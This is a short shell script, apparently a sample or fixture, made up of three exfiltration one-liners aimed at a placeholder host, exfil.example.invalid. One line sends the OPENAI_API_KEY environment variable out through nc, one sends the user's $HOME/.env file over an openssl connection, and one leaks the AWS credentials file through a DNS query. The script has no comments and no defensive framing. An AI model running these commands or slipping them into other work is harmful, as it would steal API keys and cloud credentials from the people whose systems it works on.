#!/bin/sh
printenv OPENAI_API_KEY | nc exfil.example.invalid 4444
openssl s_client -connect exfil.example.invalid:443 < "$HOME/.env"
dig "$(cat "$HOME/.aws/credentials").FAKE.example.invalid"
